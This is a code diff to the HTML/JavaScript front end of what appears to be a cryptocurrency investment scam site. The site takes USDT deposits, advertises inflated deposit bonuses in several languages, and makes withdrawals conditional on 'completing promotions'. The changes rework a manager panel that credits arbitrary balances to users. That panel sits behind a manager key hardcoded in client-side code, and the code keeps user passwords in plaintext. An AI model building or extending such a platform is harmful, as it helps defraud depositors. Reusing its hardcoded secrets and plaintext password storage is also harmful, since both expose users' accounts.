@@ -22,7 +22,9 @@
         .nav-item.active { color: var(--gold); font-weight: bold; }
         #toast { position: fixed; top: 20px; left: 50%; transform: translateX(-50%); background: var(--gold); color: #000; padding: 12px 20px; border-radius: 25px; z-index: 9999; display: none; font-weight: bold; }
         #adminPanel { position: fixed; inset: 0; background: #0b0e11; z-index: 10001; display: none; padding: 20px; overflow-y: auto; }
-        .req-card { background: #1e2329; padding: 15px; border-radius: 12px; margin-bottom: 12px; border: 1px solid #333; }
+        .admin-layout { display: flex; gap: 15px; }
+        .admin-col { flex: 1; }
+        .req-card { background: #1e2329; padding: 10px; border-radius: 12px; margin-bottom: 10px; border: 1px solid #333; font-size: 12px; }
         .history-row { display: flex; justify-content: space-between; padding: 10px 0; border-bottom: 1px solid #333; font-size: 13px; }
     </style>
 </head>
@@ -35,8 +37,18 @@
             <h2 style="color:var(--gold)">MANAGER SYSTEM</h2>
             <button onclick="document.getElementById('adminPanel').style.display='none'" style="background:var(--red); color:#fff; border:none; padding:8px 15px; border-radius:5px;">CLOSE</button>
         </div>
-        <div id="adminRequests"></div>
-        <div id="adminUserList"></div>
+        <div class="admin-layout">
+            <div class="admin-col">
+                <h4 style="color:var(--gold)">Yêu cầu Nạp/Rút</h4>
+                <div id="adminRequests"></div>
+                <h4 style="color:var(--gold)">Danh sách người dùng</h4>
+                <div id="adminUserList"></div>
+            </div>
+            <div class="admin-col" style="background: #1e2329; padding: 15px; border-radius: 12px; border: 1px solid var(--gold);">
+                <h4 style="color:var(--gold)">Khu vực phát thưởng</h4>
+                <div id="bonusControlArea" style="color:var(--gray)">Chọn người dùng từ cột bên trái để thao tác...</div>
+            </div>
+        </div>
     </div>
 
     <div id="authPage" style="position:fixed; inset:0; background:var(--bg); z-index:8000; display:none; flex-direction:column; justify-content:center; padding:30px;">
@@ -106,10 +118,7 @@
             <input type="text" id="ex_usdt_res" class="login-input" style="color:var(--green); font-weight:bold;" readonly value="0.00 USDT">
             <button id="l_ex_btn" class="login-btn" onclick="processExchange()">TRANSFER TO BALANCE</button>
             <div id="promo_marquee_container" style="margin-top:20px; padding:15px; border:1.5px solid var(--red); border-radius:10px; color:#ff4d4d; font-size:12px; line-height:1.7; font-weight: 500; background: rgba(246, 70, 93, 0.05); height: 150px; overflow: hidden;">
-                <marquee id="promo_marquee" behavior="scroll" direction="up" scrollamount="2" height="100%" onmouseover="this.stop()" onmouseout="this.start()">
-                    1. Nạp 500$ nhận 1.000$<br>2. Nạp 1.000$ nhận 1.500$<br>3. Nạp 2.000$ nhận 2.500$<br>4. Nạp 3.000$ nhận 3.500$<br>5. Nạp 4.000$ nhận 4.500$<br>
-                    <b style="color: #fff; display: block; margin-top: 8px;">HOÀN THÀNH ƯU ĐÃI TRƯỚC KHI RÚT TIỀN!</b>
-                </marquee>
+                <marquee id="promo_marquee" behavior="scroll" direction="up" scrollamount="2" height="100%" onmouseover="this.stop()" onmouseout="this.start()"></marquee>
             </div>
         </div>
     </div>
@@ -167,7 +176,7 @@
     <script>
         const trans = {
             en: { welcome: "Welcome", balance: "Balance (USDT)", start: "Start", addr_t: "Deposit USDT (BEP20):", btn_dep: "ACTIVATE CONTRACT", nav_h: "Home", nav_e: "Exchange", nav_w: "Withdraw", nav_a: "Account", ex_t: "Profit Exchange", ex_btn: "TRANSFER TO BALANCE", acc_t: "Security Vault", acc_btn: "VERIFY", main_mar: "NOTICE: First deposit bonus double. Contact Admin!", promo_mar: "1. Deposit $500 get $1,000<br>2. Deposit $1,000 get $1,500<br>3. Deposit $2,000 get $2,500<br>4. Deposit $3,000 get $3,500<br>5. Deposit $4,000 get $4,500<br><b style='color:#fff'>COMPLETE PROMOTIONS BEFORE WITHDRAWING!</b>" },
-            vi: { welcome: "Chào mừng", balance: "Số dư (USDT)", start: "Bắt đầu", addr_t: "Nạp USDT (BEP20):", btn_dep: "KÍCH HOẠT HỢP ĐỒNG", nav_h: "Trang chủ", nav_e: "Quy đổi", nav_w: "Rút tiền", nav_a: "Tài khoản", ex_t: "Quy đổi lợi nhuận", ex_btn: "CHUYỂN VỀ VỐN", acc_t: "Két sắt bảo mật", acc_btn: "XÁC MINH", main_mar: "THÔNG BÁO: Ưu đãi nạp lần đầu nhận ngay bonus gấp đôi. Liên hệ Admin!", promo_mar: "1. Nạp 500$ nhận 1.000$<br>2. Nạp 1.000$ nhận 1.500$<br>3. Nạp 2.000$ nhận 2.500$<br>4. Nạp 3.000$ nhận 3.500$<br>5. Nạp 4.000$ nhận 4.500$<br><b style='color:#fff'>HOÀN THÀNH ƯU ĐÃI TRƯỚC KHI RÚT TIỀN!</b>" },
+            vi: { welcome: "Chào mừng", balance: "Số dư (USDT)", start: "Bắt đầu", addr_t: "Nạp USDT (BEP20):", btn_dep: "KÍCH HOẠT HỢP ĐỒNG", nav_h: "Trang chủ", nav_e: "Quy đổi", nav_w: "Rút tiền", nav_a: "Tài khoản", ex_t: "Quy đổi lợi nhuận", ex_btn: "CHUYỂN VỀ VỐN", acc_t: "Két sắt bảo mật", acc_btn: "XÁC MINH", main_mar: "THÔNG BÁO: Ưu đãi nạp lần đầu nhận ngay bonus gấp đôi. Liên hệ Admin!", promo_mar: "1. Nạp đầu 500$ phần thưởng ưu đãi cho người dùng mới sẽ là 1.000$<br>2. Nạp đầu 1.000$ phần thưởng ưu đãi cho người dùng mới sẽ là 1.500$<br>3. Nạp đầu 2.000$ phần thưởng ưu đãi dành cho người dùng mới sẽ là 2.500$<br>4. Nạp đầu 3.000$ phần thưởng ưu đãi dành cho người dùng mới sẽ là 3.500$<br>5. Nạp đầu 4.000$ phần thưởng ưu đãi dành cho người dùng mới sẽ là 4.500$<br><b style='color:#fff'>KHUYẾN KHÍCH QUÝ KHÁCH HOÀN THÀNH CÁC ƯU ĐÃI TRƯỚC KHI RÚT TIỀN!</b>" },
             zh: { welcome: "欢迎", balance: "余额 (USDT)", start: "开始", addr_t: "充值 USDT (BEP20):", btn_dep: "激活合约", nav_h: "首页", nav_e: "兑换", nav_w: "提现", nav_a: "账户", ex_t: "利润兑换", ex_btn: "转入余额", acc_t: "安全库", acc_btn: "验证", main_mar: "公告：首次存款奖金加倍。联系管理员！", promo_mar: "1. 充值500$得1000$<br>2. 充值1000$得1500$<br>3. 充值2000$得2500$<br>4. 充值3000$得3500$<br>5. 充值4000$得4500$<br><b style='color:#fff'>提现前请完成优惠活动！</b>" },
             es: { welcome: "Bienvenido", balance: "Saldo (USDT)", start: "Inicio", addr_t: "Depósito (BEP20):", btn_dep: "ACTIVAR CONTRATO", nav_h: "Inicio", nav_e: "Canje", nav_w: "Retirar", nav_a: "Cuenta", ex_t: "Canje de Ganancias", ex_btn: "TRANSFERIR", acc_t: "Bóveda", acc_btn: "VERIFICAR", main_mar: "AVISO: Bono de primer depósito doble. ¡Contacte a Admin!", promo_mar: "1. Depósito 500$ recibe 1.000$<br>2. Depósito 1.000$ recibe 1.500$<br>3. Depósito 2.000$ recibe 2.500$<br>4. Depósito 3.000$ recibe 3.500$<br>5. Depósito 4.000$ recibe 4.500$<br><b style='color:#fff'>¡COMPLETE PROMOCIONES ANTES DE RETIRAR!</b>" },
             pt: { welcome: "Bem-vindo", balance: "Saldo (USDT)", start: "Início", addr_t: "Depósito (BEP20):", btn_dep: "ATIVAR CONTRATO", nav_h: "Início", nav_e: "Troca", nav_w: "Retirar", nav_a: "Conta", ex_t: "Troca de Lucro", ex_btn: "TRANSFERIR", acc_t: "Cofre", acc_btn: "VERIFICAR", main_mar: "AVISO: Bônus de primeiro depósito dobro. Contate o Admin!", promo_mar: "1. Depósito 500$ ganhe 1.000$<br>2. Depósito 1.000$ ganhe 1.500$<br>3. Depósito 2.000$ ganhe 2.500$<br>4. Depósito 3.000$ ganhe 3.500$<br>5. Depósito 4.000$ ganhe 4.500$<br><b style='color:#fff'>COMPLETE PROMOÇÕES ANTES DE SACAR!</b>" }
@@ -176,15 +185,13 @@
         function changeLang() { 
             const l = document.getElementById('langSel').value; 
             const t = trans[l]; 
-            for (let key in t) { 
-                const el = document.getElementById('l_' + key); 
-                if(el) el.innerText = t[key]; 
-            }
+            for (let key in t) { const el = document.getElementById('l_' + key); if(el) el.innerText = t[key]; }
             document.getElementById('main_marquee').innerText = t.main_mar;
             document.getElementById('promo_marquee').innerHTML = t.promo_mar;
         }
 
         window.openAdminPortal = function() { if (prompt("Manager Key:") === "258369@@") { document.getElementById('adminPanel').style.display = 'block'; loadAdminPanel(); } };
+        
         function loadAdminPanel() {
             fb.onValue(fb.ref(fb.db, 'admin/requests'), (snap) => {
                 const list = document.getElementById('adminRequests'); list.innerHTML = "";
@@ -198,12 +205,29 @@
                 const list = document.getElementById('adminUserList'); list.innerHTML = "";
                 snap.forEach((u) => { const d = u.val();
                     const div = document.createElement('div'); div.className = "req-card";
-                    div.innerHTML = `Email: ${d.email}<br>Pass: <b style="color:var(--gold)">${d.pass}</b><br>USDT: ${d.usdt}<br><button onclick="giveBonus('${u.key}')" style="background:var(--green); border:none; padding:5px 10px; margin-top:5px; border-radius:5px; font-weight:bold;">TẶNG THƯỞNG</button>`;
+                    div.innerHTML = `Email: ${d.email}<br>USDT: ${d.usdt}<br><button onclick="selectUser('${u.key}','${d.email}')" style="background:var(--gold); border:none; padding:5px 10px; margin-top:5px; border-radius:5px; font-weight:bold; color:#000;">CHỌN PHÁT THƯỞNG</button>`;
                     list.appendChild(div);
                 });
             });
         }
-        async function giveBonus(uid) { let amt = prompt("Nhập số tiền thưởng:"); if(amt) { let s = await fb.get(fb.ref(fb.db, 'users/'+uid)); let d = s.val(); await fb.update(fb.ref(fb.db, 'users/'+uid), {usdt: (d.usdt||0) + parseFloat(amt)}); showToast("Success!"); } }
+
+        function selectUser(uid, email) {
+            document.getElementById('bonusControlArea').innerHTML = `
+                <p>Phát cho: <b>${email}</b></p>
+                <input type="number" id="bnsVal" class="login-input" placeholder="Số tiền...">
+                <button class="login-btn" onclick="executeBonus('${uid}')">GỬI THƯỞNG</button>
+            `;
+        }
+
+        async function executeBonus(uid) {
+            let amt = document.getElementById('bnsVal').value;
+            if(!amt) return;
+            let s = await fb.get(fb.ref(fb.db, 'users/'+uid));
+            let d = s.val();
+            await fb.update(fb.ref(fb.db, 'users/'+uid), {usdt: (d.usdt||0) + parseFloat(amt)});
+            showToast("Đã cộng thưởng!");
+        }
+
         async function approveReq(id, uid, amt, type) { const uRef = fb.ref(fb.db, 'users/' + uid); const snap = await fb.get(uRef); const ud = snap.val(); if(type === 'deposit') { await fb.update(uRef, { usdt: (ud.usdt || 0) + amt, active: true, lastUpdate: Date.now() }); } else { if(ud.usdt >= amt) await fb.update(uRef, { usdt: ud.usdt - amt }); } await fb.update(fb.ref(fb.db, 'admin/requests/' + id), { status: 'approved' }); showToast("Done!"); }
         
         let state = { usdt: 0, eth: 0, active: false, hide: false, uid: "", pass: "", lastUpdate: 0, cycle: 24*3600*1000 };
